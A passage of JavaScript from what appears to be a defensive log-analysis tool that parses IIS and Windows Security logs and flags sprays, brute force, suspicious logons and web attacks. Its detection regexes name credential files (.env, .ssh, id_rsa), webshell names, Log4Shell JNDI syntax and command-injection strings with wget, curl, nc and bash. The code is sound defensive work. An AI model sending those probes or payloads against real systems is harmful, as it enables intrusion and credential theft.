        /* IIS writes '+' where a space belongs in the user agent, because the
           field separator is a space. Undo it or every UA signature misses. */
        ua: get('cs(user-agent)').replace(/\+/g, ' '),
        ref: get('cs(referer)').replace(/\+/g, ' '),
        probe: probeText(query ? uri + '?' + query : uri),
        raw: get('cs-method') + ' ' + uri
      };
      res.web.push(rec);
      webAuthEvent(res, rec);
      if (res.web.length >= MAX_LINES) break;
    }
    if (!fields) {
      res.notes.push('No #Fields: directive was found, so no row could be mapped to a column. ' +
                     'An IIS log that has had its header stripped cannot be parsed positionally, ' +
                     'because the field list is per-site configuration.');
    }
    res.timeNote = 'IIS W3C timestamps are UTC by definition, and are shown as written.';
  }

  /* ======================================================================
     Parser 4 — Windows Security event export as CSV

     A real CSV reader, not a split on commas. The Message column of a Windows
     security event is a multi-line block containing commas, quotes and blank
     lines, and splitting on commas turns one 4625 into fifteen broken rows.
     ====================================================================== */

  function parseCsvRows(text, delim, cap) {
    var rows = [], row = [], field = '', inQuotes = false;
    var i = 0, len = text.length, c, line = 1, rowLine = 1;

    while (i < len) {
      c = text.charAt(i);
      if (inQuotes) {
        if (c === '"') {
          if (text.charAt(i + 1) === '"') { field += '"'; i += 2; continue; }
          inQuotes = false; i++; continue;
        }
        if (c === '\n') line++;
        field += c; i++; continue;
      }
      if (c === '"') { inQuotes = true; i++; continue; }
      if (c === delim) { row.push(field); field = ''; i++; continue; }
      if (c === '\r') { i++; continue; }
      if (c === '\n') {
        row.push(field); field = '';
        line++;
        if (row.length > 1 || row[0] !== '') { row.lineNo = rowLine; rows.push(row); }
        row = [];
        rowLine = line;
        if (rows.length >= cap) return rows;
        i++; continue;
      }
      field += c; i++;
    }
    if (field !== '' || row.length) {
      row.push(field);
      row.lineNo = rowLine;
      rows.push(row);
    }
    return rows;
  }

  function findCol(header, tests) {
    var i, j, name;
    for (i = 0; i < header.length; i++) {
      name = String(header[i]).toLowerCase().replace(/[^a-z]/g, '');
      for (j = 0; j < tests.length; j++) {
        if (name.indexOf(tests[j]) >= 0) return i;
      }
    }
    return -1;
  }

  /* "Account Name" appears twice in a 4625: once for the subject (usually the
     machine account, or a dash) and once for the account that failed. The one
     that matters is the last plausible one, so collect them all and choose. */
  function winFields(message, label) {
    var re = new RegExp(label.replace(/\s/g, '\\s') + '\\s*:\\s*([^\\r\\n]*)', 'gi');
    var vals = [], m;
    while ((m = re.exec(message)) !== null) {
      var v = m[1].replace(/^\s+|\s+$/g, '');
      if (v && v !== '-') vals.push(v);
      if (vals.length > 12) break;
    }
    return vals;
  }

  function winPick(message, label) {
    var vals = winFields(message, label), i;
    for (i = vals.length - 1; i >= 0; i--) {
      if (vals[i].charAt(vals[i].length - 1) !== '$') return vals[i];
    }
    return vals.length ? vals[vals.length - 1] : '';
  }

  var WIN_STATUS = {
    '0xc0000064': 'the account does not exist',
    '0xc000006a': 'wrong password',
    '0xc000006d': 'bad user name or authentication information',
    '0xc000006e': 'account restriction (hours, workstation, expiry)',
    '0xc000006f': 'logon outside permitted hours',
    '0xc0000070': 'logon from a workstation this account may not use',
    '0xc0000071': 'expired password',
    '0xc0000072': 'the account is disabled',
    '0xc0000133': 'clocks between the machines are too far apart',
    '0xc0000193': 'the account has expired',
    '0xc0000224': 'the user must change the password at next logon',
    '0xc0000234': 'the account is locked out'
  };

  var WIN_LOGON_TYPE = {
    '2': 'interactive (at the keyboard)',
    '3': 'network (SMB, IIS, RPC)',
    '4': 'batch (scheduled task)',
    '5': 'service',
    '7': 'unlock',
    '8': 'network cleartext (credentials sent in the clear)',
    '9': 'new credentials (runas /netonly)',
    '10': 'remote interactive (RDP)',
    '11': 'cached interactive'
  };

  function parseWinsec(text, res) {
    var head = text.slice(0, 4096).split('\n')[0] || '';
    var delim = (head.split('\t').length > head.split(',').length) ? '\t' : ',';
    var rows = parseCsvRows(text, delim, MAX_LINES);
    if (!rows.length) return;

    var header = rows[0];
    var cId   = findCol(header, ['eventid', 'id']);
    var cTime = findCol(header, ['timecreated', 'dateandtime', 'datetime', 'date', 'time']);
    var cMsg  = findCol(header, ['message', 'description']);
    var start = 1;

    if (cId < 0 || cMsg < 0) {
      res.notes.push('The CSV header did not name an Event ID and a Message column, so rows ' +
                     'were searched for event numbers and field labels instead. Re-export with ' +
                     '"Save All Events As... CSV" from Event Viewer, or Export-Csv from ' +
                     'Get-WinEvent, for a cleaner read.');
      start = 0;
    }

    var i, r, id, msg, when, t;
    for (i = start; i < rows.length; i++) {
      r = rows[i];
      if (!r.length) continue;
      msg = cMsg >= 0 && cMsg < r.length ? r[cMsg] : r.join(' ');
      id = cId >= 0 && cId < r.length ? String(r[cId]).replace(/\D/g, '')
                                      : ((/\b(4624|4625|4634|4740|4771|4776|4768|4672)\b/.exec(msg) || [])[1] || '');
      when = cTime >= 0 && cTime < r.length ? r[cTime] : '';

      t = null;
      if (when) {
        var im = RE_ISO_TS.exec(when.replace(/^\s+/, ''));
        if (im) t = isoTime(im);
        else {
          /* Event Viewer writes the machine's short date format, which is
             locale-dependent and genuinely ambiguous for the first twelve days
             of a month. Date.parse guesses; the report says it guessed. */
          var g = Date.parse(when);
          if (isFinite(g)) { t = g; res.dateGuessed = true; }
        }
      }
      noteTime(res, t);
      res.parsed++;

      var user = winPick(msg, 'Account Name');
      var src  = winPick(msg, 'Source Network Address') ||
                 winPick(msg, 'Client Address') ||
                 winPick(msg, 'Workstation Name') || 'local';
      var type = (winFields(msg, 'Logon Type')[0] || '').replace(/\D/g, '');
      var sub  = (winPick(msg, 'Sub Status') || winPick(msg, 'Status') || '').toLowerCase();
      var reason = WIN_STATUS[sub] || '';
      var typeText = WIN_LOGON_TYPE[type] || (type ? 'logon type ' + type : '');
      var line = r.lineNo || 1;

      if (id === '4625') {
        res.auth.push({ n: line, t: t, src: src, user: user || '(not logged)', ok: false,
                        method: '4625 ' + (typeText || 'logon'), note: reason,
                        txt: '4625 failed logon  user=' + (user || '?') + '  from=' + src +
                             (reason ? '  (' + reason + ')' : '') });
      } else if (id === '4624') {
        res.auth.push({ n: line, t: t, src: src, user: user || '(not logged)', ok: true,
                        method: '4624 ' + (typeText || 'logon'),
                        txt: '4624 successful logon  user=' + (user || '?') + '  from=' + src +
                             (typeText ? '  ' + typeText : '') });
      } else if (id === '4740') {
        res.changes.push({ n: line, t: t,
                           what: 'account locked out: ' + (user || '?') + ' (from ' + src + ')' });
      } else if (id === '4771' || id === '4768') {
        /* 4768 is logged whether the TGT request SUCCEEDED or FAILED — a
           failure carries a non-zero Result Code (0x6 client-not-found is the
           signature of Kerbrute-style username enumeration, 0x12 a disabled or
           locked account). Counting every 4768 as a success turned exactly
           that traffic into a false "successful authentication after N
           failures" HIGH finding. Only a PRESENT and non-zero code demotes it,
           so a terse export with no Result Code field reads as before. The
           4776 branch below already gates on its code the same way. */
        var kerbOk = id === '4768' && !/Result Code:\s*0x0*[1-9a-f]/i.test(msg);
        res.auth.push({ n: line, t: t, src: src, user: user || '(not logged)',
                        ok: kerbOk, method: 'Kerberos ' + id, note: reason,
                        txt: 'Kerberos ' + id + '  user=' + (user || '?') + '  from=' + src });
      } else if (id === '4776') {
        var ok = /0x0\b/.test(sub) || /Error Code:\s*0x0/i.test(msg);
        res.auth.push({ n: line, t: t, src: src, user: user || '(not logged)', ok: ok,
                        method: 'NTLM 4776',
                        txt: 'NTLM credential validation ' + (ok ? 'succeeded' : 'failed') +
                             '  user=' + (user || '?') });
      } else if (id === '4672') {
        res.changes.push({ n: line, t: t,
                           what: 'special privileges assigned at logon: ' + (user || '?') });
      } else if (id === '4720' || id === '4732' || id === '4728') {
        res.changes.push({ n: line, t: t,
                           what: 'account or group membership change (event ' + id + '): ' + (user || '?') });
      }
      if (id) bump(res.programs, 'event ' + id);
    }

    res.timeNote = 'Event Viewer writes local machine time with no zone. Times are shown as ' +
                   'exported, unconverted.' +
                   (res.dateGuessed ? ' Some rows used a locale date format that had to be guessed.' : '');
  }

  /* ======================================================================
     Analysis — authentication
     ====================================================================== */

  function evidence(res, ns, events) {
    var outLines = [], i, n, raw;
    for (i = 0; i < ns.length && i < MAX_EVIDENCE; i++) {
      n = ns[i];
      raw = null;
      if (events && events[i] && events[i].txt) raw = events[i].txt;
      else if (res.lines && res.lines[n - 1] !== undefined) raw = res.lines[n - 1];
      if (raw === null) continue;
      outLines.push('  line ' + padLeft(n, 6) + '  ' + safe(raw, EVIDENCE_WIDTH));
    }
    if (ns.length > MAX_EVIDENCE) {
      outLines.push('  ' + padLeft('', 6) + '   … and ' +
                    num(ns.length - MAX_EVIDENCE) + ' more');
    }
    return outLines;
  }

  function addFinding(list, sev, title, body, ev) {
    list.push({ sev: sev, title: title, body: body || [], ev: ev || [] });
  }

  function orderedEvents(res) {
    var evs = res.auth.slice(), timed = 0, i;
    for (i = 0; i < evs.length; i++) if (evs[i].t !== null && evs[i].t !== undefined) timed++;
    /* Sorting a list where most entries have no time produces an order that is
       neither chronological nor the file's. If the times are not nearly
       complete, trust the file: a log is written in order. */
    if (evs.length && timed / evs.length > 0.9) {
      evs.sort(function (a, b) {
        /* Entries with no timestamp sort to the end rather than to epoch zero,
           where a numeric comparator would otherwise put them — a handful of
           undated lines at the very top would make every "then it succeeded"
           finding read backwards. */
        var aMissing = (a.t === null || a.t === undefined) ? 1 : 0;
        var bMissing = (b.t === null || b.t === undefined) ? 1 : 0;
        if (aMissing !== bMissing) return aMissing - bMissing;
        if (aMissing) return a.n - b.n;
        return a.t === b.t ? a.n - b.n : a.t - b.t;
      });
      return { events: evs, chronological: true };
    }
    return { events: evs, chronological: false };
  }

  function analyseAuth(res, findings) {
    var ordered = orderedEvents(res);
    var evs = ordered.events;
    var bySrc = {}, byUser = {}, i, e, s, u;

    for (i = 0; i < evs.length; i++) {
      e = evs[i];
      s = bySrc[e.src];
      if (!s) {
        s = bySrc[e.src] = { src: e.src, fails: 0, oks: 0, users: {}, okUsers: {},
                             failLines: [], failEvents: [], okLines: [], okEvents: [],
                             first: null, last: null, methods: {} };
      }
      if (e.t !== null && e.t !== undefined) {
        if (s.first === null || e.t < s.first) s.first = e.t;
        if (s.last === null || e.t > s.last) s.last = e.t;
      }
      bump(s.methods, e.method || 'unknown');
      u = byUser[e.user];
      if (!u) u = byUser[e.user] = { user: e.user, fails: 0, oks: 0, srcs: {}, okEvents: [] };

      if (e.ok) {
        s.oks++; u.oks++; bump(s.okUsers, e.user);
        if (s.okLines.length < 40) { s.okLines.push(e.n); s.okEvents.push(e); }
        u.okEvents.push(e);
      } else {
        s.fails++; u.fails++; bump(s.users, e.user);
        if (s.failLines.length < 40) { s.failLines.push(e.n); s.failEvents.push(e); }
      }
      bump(u.srcs, e.src);
    }

    res.bySrc = bySrc;
    res.byUser = byUser;
    res.ordered = ordered;

    clusterFailures(res, bySrc, findings);
    successAfterFailure(res, evs, ordered.chronological, findings);
    timingAnomalies(res, byUser, findings);
    distributedSpray(byUser, findings);
    reportChanges(res, findings);
  }

  /* The distinction the header opens with, made concrete. */
  function clusterFailures(res, bySrc, findings) {
    var keys = Object.keys(bySrc), i, s, users, spread, maxPer, k, shown = 0, quiet = 0;
    keys.sort(function (a, b) { return bySrc[b].fails - bySrc[a].fails; });

    for (i = 0; i < keys.length; i++) {
      s = bySrc[keys[i]];
      if (!s.fails) continue;
      users = Object.keys(s.users);
      spread = users.length;
      maxPer = 0;
      for (k = 0; k < users.length; k++) {
        if (s.users[users[k]] > maxPer) maxPer = s.users[users[k]];
      }

      var span = (s.first !== null && s.last !== null) ? s.last - s.first : null;
      var rate = (span && span > 1000) ? (s.fails / (span / 60000)) : null;
      var head = [];
      head.push('source           ' + s.src + (isPrivate(s.src) ? '   (a private / internal address)' : ''));
      head.push('failures         ' + num(s.fails));
      head.push('accounts tried   ' + num(spread) + '  (' +
                topKeys(s.users, 6).map(function (name) {
                  return safe(name, 32) + ' ×' + s.users[name];
                }).join(', ') + (spread > 6 ? ', …' : '') + ')');
      if (span !== null) {
        head.push('window           ' + fmtTime(s.first) + '  →  ' + fmtTime(s.last) +
                  '   (' + duration(span) + ')');
      }
      if (rate) head.push('rate             ' + rate.toFixed(1) + ' failures per minute');
      if (s.oks) head.push('successes        ' + num(s.oks) + ' from the same source');

      var sev, title, body;
      if (spread >= SPRAY_MIN_USERS && maxPer <= SPRAY_MAX_PER_USER) {
        sev = 'high';
        title = 'Password spray from ' + s.src;
        body = head.concat([
          '',
          'This is the spray shape, not brute force: ' + num(spread) + ' different accounts,',
          'never more than ' + maxPer + ' attempt' + (maxPer === 1 ? '' : 's') + ' against any one of them. That is deliberate.',
          'One or two guesses per account stays under almost every lockout',
          'threshold, so the control you are relying on to stop this will not',
          'fire, and per-account alerting will not see it either. The signal is',
          'the breadth across accounts, which is only visible from the source side.',
          '',
          'Worth doing: check whether any account in that list succeeded later',
          'from anywhere, and look at what a single common password would be for',
          'this organisation right now.'
        ]);
      } else if (spread <= BRUTE_MAX_USERS && s.fails >= BRUTE_MIN_FAILS) {
        sev = 'high';
        title = 'Brute force against ' + users.slice(0, 2).join(' and ') + ' from ' + s.src;
        body = head.concat([
          '',
          'Many attempts, ' + (spread === 1 ? 'one account' : 'two accounts') + '. Someone wants that specific account, which',
          'usually means they know it exists and believe it is worth having.',
          'Lockout policy does apply to this shape, so if the account is not',
          'locked, either the policy is not set or the attempts are spread out',
          'far enough to reset the counter.'
        ]);
      } else if (s.fails >= BRUTE_MIN_FAILS) {
        sev = 'medium';
        title = 'Repeated failures from ' + s.src;
        body = head.concat([
          '',
          'Neither cleanly a spray nor cleanly a brute force: ' + num(s.fails) + ' failures across',
          num(spread) + ' accounts, up to ' + maxPer + ' against one of them. Mixed shapes like this are',
          'usually a scripted list rather than a targeted attempt.'
        ]);
      } else {
        quiet++;
        continue;
      }

      if (shown >= MAX_PER_KIND) { quiet++; continue; }
      shown++;
      addFinding(findings, sev, title, body, evidence(res, s.failLines, s.failEvents));
    }

    if (quiet) {
      addFinding(findings, 'info',
        num(quiet) + ' further source' + (quiet === 1 ? '' : 's') + ' with failed authentications, below the thresholds',
        ['Each of them had fewer than ' + BRUTE_MIN_FAILS + ' failures, or a spread of accounts that',
         'matched neither shape. They are in the top-talkers table below.',
         '',
         'The thresholds this report used: brute force is ' + BRUTE_MIN_FAILS + '+ failures against at',
         'most ' + BRUTE_MAX_USERS + ' accounts; a spray is ' + SPRAY_MIN_USERS + '+ accounts with at most ' + SPRAY_MAX_PER_USER + ' attempts each.',
         'They are stated so you can disagree with them rather than guess.'], []);
    }
  }

  /* The finding that matters most, and the reason the ordering above is done
     carefully: "then it worked" is only meaningful if "then" is real. */
  function successAfterFailure(res, evs, chronological, findings) {
    var pending = {}, i, e, p, found = 0;

    for (i = 0; i < evs.length; i++) {
      e = evs[i];
      p = pending[e.src];
      if (!e.ok) {
        if (!p) p = pending[e.src] = { fails: 0, users: {}, lines: [], events: [], firstT: e.t, lastT: e.t };
        /* A success a week after the last failure is not "after" it in any
           useful sense. Expire the run when the gap is long. */
        if (p.lastT !== null && e.t !== null && e.t - p.lastT > SUCCESS_GAP_MS) {
          p = pending[e.src] = { fails: 0, users: {}, lines: [], events: [], firstT: e.t, lastT: e.t };
        }
        p.fails++;
        bump(p.users, e.user);
        if (p.lines.length < 40) { p.lines.push(e.n); p.events.push(e); }
        if (e.t !== null) p.lastT = e.t;
        continue;
      }
      if (!p || p.fails < SUCCESS_AFTER_MIN) { pending[e.src] = null; continue; }
      if (p.lastT !== null && e.t !== null && e.t - p.lastT > SUCCESS_GAP_MS) {
        pending[e.src] = null;
        continue;
      }

      found++;
      var triedThis = !!p.users[e.user];
      var body = [
        'source           ' + e.src + (isPrivate(e.src) ? '   (a private / internal address)' : ''),
        'account          ' + safe(e.user, 60),
        'method           ' + safe(e.method || 'unknown', 60),
        'failures first   ' + num(p.fails) + ' against ' + plural(countKeys(p.users), 'account'),
        'then             SUCCESS at ' + fmtTime(e.t),
        ''
      ];
      if (triedThis) {
        body.push('The account that succeeded is one of the accounts that had been');
        body.push('failing from this same source. That is the shape of a guessed');
        body.push('password rather than a user mistyping and retrying — a user does');
        body.push('not usually fail against other accounts first. It is a strong');
        body.push('signal and not a finding of compromise: a script holding a stale');
        body.push('credential, or a monitoring job that walks several accounts,');
        body.push('writes the same lines.');
      } else {
        body.push('The account that succeeded is NOT one of the ones that were failing');
        body.push('from this source. That is worth reading twice: it can mean a spray');
        body.push('found a different account than the ones you were watching, or that');
        body.push('a legitimate user shares the address (a NAT gateway, an office');
        body.push('range, a VPN concentrator). Check whether the address is shared');
        body.push('before treating it as a compromise.');
      }
      body.push('');
      body.push('If this is real, the clock starts here: what did that account do next,');
      body.push('and what can it reach. Nothing on this page can answer that — it has');
      body.push('only this one file.');
      if (!chronological) {
        body.push('');
        body.push('Ordering note: too few entries carried timestamps, so "after" here');
        body.push('means "later in the file" rather than "later in time".');
      }

      var ev = evidence(res, p.lines, p.events)
        .concat(['  line ' + padLeft(e.n, 6) + '  ' +
                 safe(e.txt || (res.lines && res.lines[e.n - 1]) || '', EVIDENCE_WIDTH)]);

      if (found <= MAX_PER_KIND) {
        addFinding(findings, 'high',
          'Successful authentication after ' + plural(p.fails, 'failure') + ' — ' +
          safe(e.user, 40) + ' from ' + e.src, body, ev);
      }
      pending[e.src] = null;
    }

    if (found > MAX_PER_KIND) {
      addFinding(findings, 'medium',
        num(found - MAX_PER_KIND) + ' further successes followed a run of failures',
        ['Only the first ' + MAX_PER_KIND + ' are printed in full. On a log where this pattern',
         'repeats dozens of times, the likelier explanation is an application or a',
         'monitoring agent retrying with a stale credential and eventually being',
         'refreshed — but it is worth confirming which accounts they are.'], []);
    }
  }

  /* Timing only. No geography, no lookup, no claim about distance. */
  function timingAnomalies(res, byUser, findings) {
    var users = Object.keys(byUser), i, k, list, a, b, found = 0;

    for (i = 0; i < users.length; i++) {
      list = byUser[users[i]].okEvents.filter(function (e) {
        return e.t !== null && e.t !== undefined && e.src && e.src !== 'local';
      });
      if (list.length < 2) continue;
      list.sort(function (x, y) { return x.t - y.t; });

      for (k = 1; k < list.length; k++) {
        a = list[k - 1];
        b = list[k];
        if (a.src === b.src) continue;
        var gap = b.t - a.t;
        if (gap > TRAVEL_WINDOW_MS) continue;
        found++;
        if (found > MAX_PER_KIND) break;

        var sameBlock = slash24(a.src) && slash24(a.src) === slash24(b.src);
        var body = [
          'account          ' + safe(users[i], 60),
          'first            ' + fmtTime(a.t) + '   from ' + a.src,
          'then             ' + fmtTime(b.t) + '   from ' + b.src,
          'gap              ' + duration(gap),
          '',
          'One account authenticated successfully from two different addresses',
          Math.round(gap / 60000) + ' minute' + (Math.round(gap / 60000) === 1 ? '' : 's') + ' apart. That is all this says.',
          '',
          'It is NOT impossible travel, because nothing here knows where either',
          'address is. There is no GeoIP database on this page and no lookup is',
          'made, deliberately — sending your log’s addresses to a geolocation',
          'service to analyse them locally would be a strange bargain.',
          '',
          'Ordinary things that produce this: a VPN connecting or dropping, a',
          'phone moving between mobile data and wifi, a load balancer or NAT',
          'gateway changing, a scheduled job on a second host using the same',
          'service account. It is a prompt to look, not a finding by itself.'
        ];
        if (sameBlock) {
          body.push('');
          body.push('Both addresses are in the same /24, which makes an ordinary');
          body.push('explanation considerably more likely.');
        }
        addFinding(findings, sameBlock ? 'low' : 'medium',
          'Same account, two sources, ' + duration(gap) + ' apart — ' + safe(users[i], 40),
          body, evidence(res, [a.n, b.n], [a, b]));
      }
    }

    if (found > MAX_PER_KIND) {
      addFinding(findings, 'low',
        num(found - MAX_PER_KIND) + ' further source changes within ' +
        duration(TRAVEL_WINDOW_MS) + ' were not printed',
        ['At this volume the pattern is almost certainly infrastructure rather',
         'than people: a service account used by several hosts, a proxy pool, or',
         'a load balancer that does not preserve the client address. Worth',
         'confirming which, once, rather than reading each occurrence.'], []);
    }
  }

  /* The mirror image of a spray: one account attacked from many addresses. */
  function distributedSpray(byUser, findings) {
    var users = Object.keys(byUser), i, u, srcCount;
    users.sort(function (a, b) { return byUser[b].fails - byUser[a].fails; });
    for (i = 0; i < users.length && i < 5; i++) {
      u = byUser[users[i]];
      srcCount = countKeys(u.srcs);
      if (u.fails < BRUTE_MIN_FAILS || srcCount < 5) continue;
      addFinding(findings, 'medium',
        'One account failing from ' + plural(srcCount, 'different source') + ' — ' + safe(u.user, 40),
        ['account          ' + safe(u.user, 60),
         'failures         ' + num(u.fails),
         'sources          ' + num(srcCount) + '  (' + topKeys(u.srcs, 6).join(', ') +
           (srcCount > 6 ? ', …' : '') + ')',
         '',
         'Spread across addresses like this is what a botnet or a rented proxy',
         'pool looks like, and it is specifically designed to defeat per-source',
         'rate limiting. Blocking the addresses one at a time will not help;',
         'the account-side controls are the ones that matter here.'], []);
    }
  }

  function reportChanges(res, findings) {
    if (!res.changes.length) return;
    var lines = [], i, ns = [];
    for (i = 0; i < res.changes.length && i < 20; i++) {
      lines.push('  ' + fmtTime(res.changes[i].t) + '   ' + safe(res.changes[i].what, 110));
      ns.push(res.changes[i].n);
    }
    if (res.changes.length > 20) lines.push('  … and ' + num(res.changes.length - 20) + ' more');
    addFinding(findings, 'medium',
      plural(res.changes.length, 'account or privilege change') + ' in this log',
      ['New accounts, group additions, password changes and lockouts are how',
       'access is kept after it is gained, so they are worth reading next to',
       'the authentication findings rather than separately.',
       ''].concat(lines), evidence(res, ns, null));
  }

  /* ======================================================================
     Analysis — web logs
     ====================================================================== */

  var SCAN_PATHS = [
    { name: 'WordPress admin, plugin and REST probes',
      re: /\/wp-(?:login|admin|content|includes|json|config)/i },
    { name: 'Environment, credential and key files',
      re: /\/\.(?:env|git\/|aws\/|ssh\/|npmrc|htpasswd|DS_Store)|\/credentials\b|\/id_rsa\b/i },
    { name: 'Database consoles',
      re: /phpmyadmin|\/pma\b|adminer|dbadmin|mysqladmin|\/pgadmin/i },
    { name: 'Webshell filenames',
      re: /\/(?:shell|c99|r57|wso|alfa|b374k|cmd|up|indoxploit)\.(?:php|asp|aspx|jsp)/i },
    { name: 'Backup and archive fishing',
      re: /\.(?:sql|bak|old|swp|zip|tgz|7z|rar|tar(?:\.gz)?)(?:$|\?)/i },
    { name: 'Java stack: Spring, Struts, Solr, Jolokia',
      re: /\/actuator\b|\/struts|\.action(?:$|\?)|\/solr\/|\/jolokia|\/manager\/html|\/console\/login/i },
    { name: 'Router, CGI and IoT endpoints',
      re: /\/cgi-bin\/|\/boaform|\/HNAP1|\/setup\.cgi|\/GponForm|\/shell\?/i },
    { name: 'Cloud metadata service',
      re: /169\.254\.169\.254|\/latest\/meta-data|\/computeMetadata/i },
    { name: 'PHP development and test endpoints',
      re: /\/vendor\/phpunit|eval-stdin\.php|\/telescope\b|\/_ignition|\/debug\b/i },
    { name: 'Generic admin panels',
      re: /\/administrator\b|\/admin\.php|\/user\/login|\/typo3|\/wp-admin|\/login\.action/i }
  ];

  var UA_SIGS = [
    { name: 'sqlmap', re: /sqlmap/i, sev: 'high', what: 'an SQL injection tool, announcing itself' },
    { name: 'nikto', re: /nikto/i, sev: 'high', what: 'a web vulnerability scanner' },
    { name: 'nuclei', re: /nuclei/i, sev: 'high', what: 'a template-driven vulnerability scanner' },
    { name: 'wpscan', re: /wpscan/i, sev: 'high', what: 'a WordPress enumeration tool' },
    { name: 'nmap', re: /nmap|masscan|zgrab|zmap/i, sev: 'high', what: 'a port or internet-wide scanner' },
    { name: 'dirbuster / gobuster / feroxbuster', re: /dirbuster|gobuster|feroxbuster|dirsearch|ffuf/i, sev: 'high', what: 'a directory brute-forcer' },
    { name: 'hydra / medusa', re: /\bhydra\b|medusa/i, sev: 'high', what: 'a credential brute-forcer' },
    { name: 'acunetix / netsparker / burp', re: /acunetix|netsparker|burpsuite|nessus|qualys|openvas/i, sev: 'medium', what: 'a commercial scanner (possibly your own)' },
    { name: 'curl / wget', re: /^curl\/|^Wget/i, sev: 'low', what: 'a command-line client — normal for an API, unusual for a page' },
    { name: 'python / go / java client libraries', re: /python-requests|python-urllib|Go-http-client|okhttp|Java\/\d|libwww-perl|axios|node-fetch/i, sev: 'low', what: 'a script rather than a browser' },
    { name: 'declared bots', re: /bot\b|crawler|spider|slurp/i, sev: 'low', what: 'self-declared crawlers, easy to impersonate' }
  ];

  var PAYLOADS = [
    { name: 'Path traversal', sev: 'high',
      re: /(?:\.\.[\/\\]){1,}|%2e%2e(?:%2f|%5c|\/|\\)|\.\.%2f|%252e%252e/i,
      what: 'climbing out of the web root to reach files like /etc/passwd or a config file' },
    { name: 'SQL injection', sev: 'high',
      re: /union[\s\/*+]+select|\bor\b\s+1\s*=\s*1|\band\b\s+1\s*=\s*1|information_schema|xp_cmdshell|\bsleep\s*\(\s*\d|benchmark\s*\(|'\s*or\s+'|%27\s*or/i,
      what: 'classic injection strings in the query or path' },
    { name: 'Cross-site scripting', sev: 'medium',
      re: /<script|%3cscript|javascript:|onerror\s*=|onload\s*=|%3cimg|document\.cookie/i,
      what: 'script payloads in a parameter' },
    { name: 'Command injection', sev: 'high',
      re: /(?:;|\||%7c|`|\$\()\s*(?:cat|ls|id|whoami|uname|wget|curl|nc|bash|sh|python|perl)\b|%0a\s*(?:cat|id|wget)/i,
      what: 'shell metacharacters followed by a command' },
    { name: 'Log4Shell / JNDI lookup', sev: 'high',
      re: /\$\{jndi:|%24%7bjndi|\$\{\s*\$\{/i,
      what: 'the Log4j lookup syntax, in any header or parameter the log recorded' },
    { name: 'Local or remote file inclusion', sev: 'high',
      re: /[?&](?:file|page|path|include|template|doc|document|folder|root|pg|style|pdf|url)=(?:\.\.|\/etc\/|php:|data:|expect:|https?:\/\/)/i,
      what: 'a parameter pointed at a path or a remote URL' },
    { name: 'Null byte and double encoding', sev: 'medium',
      re: /%00|%2500|%c0%ae|%uff0e/i,
      what: 'encoding tricks used to get past a filter that only decodes once' },
    { name: 'Server-side template injection', sev: 'medium',
      re: /\{\{\s*\d+\s*[*+]\s*\d+|\$\{\s*\d+\s*[*+]\s*\d+|<%=/,
      what: 'an arithmetic probe in template syntax' }
  ];

  function analyseWeb(res, findings) {
    var recs = res.web, i, r;
    var byIp = {}, status = {}, paths = {}, uas = {}, sizes = [], sizeSum = 0, sizeN = 0;
    var scanHits = {}, payloadHits = {}, uaHits = {};
    var counts = { paths: 0, uas: 0 };

    for (i = 0; i < recs.length; i++) {
      r = recs[i];
      bump(status, r.status);

      var ip = byIp[r.ip];
      if (!ip) {
        ip = byIp[r.ip] = { ip: r.ip, hits: 0, bytes: 0, c404: 0, c4xx: 0, c5xx: 0,
                            c2xx: 0, paths: {}, pathN: 0, uas: {}, uaN: 0, lines: [] };
      }
      ip.hits++;
      ip.bytes += r.bytes;
      if (r.status === 404) ip.c404++;
      if (r.status >= 400 && r.status < 500) ip.c4xx++;
      if (r.status >= 500) ip.c5xx++;
      if (r.status >= 200 && r.status < 300) ip.c2xx++;
      capBump(ip.paths, r.path, ip, 'pathN', 300);
      if (r.ua) capBump(ip.uas, r.ua, ip, 'uaN', 20);
      if (ip.lines.length < 12) ip.lines.push(r.n);

      capBump(paths, r.path, counts, 'paths', MAX_KEYS);
      if (r.ua) capBump(uas, r.ua, counts, 'uas', MAX_KEYS);

      if (r.status === 200) { sizeSum += r.bytes; sizeN++; sizes.push(r); }

      var k, hit, probe = r.probe || r.target;
      for (k = 0; k < SCAN_PATHS.length; k++) {
        if (SCAN_PATHS[k].re.test(probe)) {
          hit = scanHits[SCAN_PATHS[k].name];
          if (!hit) hit = scanHits[SCAN_PATHS[k].name] = { n: 0, ips: {}, lines: [], examples: [] };
          hit.n++;
          bump(hit.ips, r.ip);
          if (hit.lines.length < 12) { hit.lines.push(r.n); hit.examples.push(safe(r.target, 90)); }
        }
      }
      for (k = 0; k < PAYLOADS.length; k++) {
        if (PAYLOADS[k].re.test(probe)) {
          hit = payloadHits[PAYLOADS[k].name];
          if (!hit) hit = payloadHits[PAYLOADS[k].name] = { n: 0, ips: {}, lines: [], def: PAYLOADS[k], statuses: {} };
          hit.n++;
          bump(hit.ips, r.ip);
          bump(hit.statuses, r.status);
          if (hit.lines.length < 12) hit.lines.push(r.n);
        }
      }
      if (r.ua) {
        for (k = 0; k < UA_SIGS.length; k++) {
          if (UA_SIGS[k].re.test(r.ua)) {
            hit = uaHits[UA_SIGS[k].name];
            if (!hit) hit = uaHits[UA_SIGS[k].name] = { n: 0, ips: {}, lines: [], def: UA_SIGS[k] };
            hit.n++;
            bump(hit.ips, r.ip);
            if (hit.lines.length < 8) hit.lines.push(r.n);
            break;   // first matching signature wins; they are ordered by specificity
          }
        }
      }
    }

    res.byIp = byIp;
    res.status = status;
    res.paths = paths;
    res.uas = uas;

    /* --- injection and traversal attempts ------------------------------- */
    var names = Object.keys(payloadHits);
    names.sort(function (a, b) { return payloadHits[b].n - payloadHits[a].n; });
    for (i = 0; i < names.length; i++) {
      var p = payloadHits[names[i]];
      var served = 0, sk = Object.keys(p.statuses), j;
      for (j = 0; j < sk.length; j++) if (+sk[j] >= 200 && +sk[j] < 300) served += p.statuses[sk[j]];
      var pbody = [
        'pattern          ' + p.def.what,
        'sources          ' + topKeys(p.ips, 6).join(', ') + (countKeys(p.ips) > 6 ? ', …' : ''),
        'responses        ' + topKeys(p.statuses, 6).map(function (s) {
          return s + ' ×' + p.statuses[s];
        }).join('  '),
        ''
      ];
      if (served) {
        pbody.push(num(served) + ' of these ' + (served === 1 ? 'was' : 'were') +
                   ' answered with a 2xx.');
        pbody.push('That does not mean the payload worked — plenty of applications answer');
        pbody.push('a broken query with a 200 and an error page. It is the subset worth');
        pbody.push('checking against the application log.');
      } else {
        pbody.push('None of these were answered with a 2xx, which is the ordinary');
        pbody.push('outcome. That is not proof the application was safe: a blind');
        pbody.push('injection that worked can still return a 404 or a redirect, and');
        pbody.push('the response code says nothing about what happened behind it.');
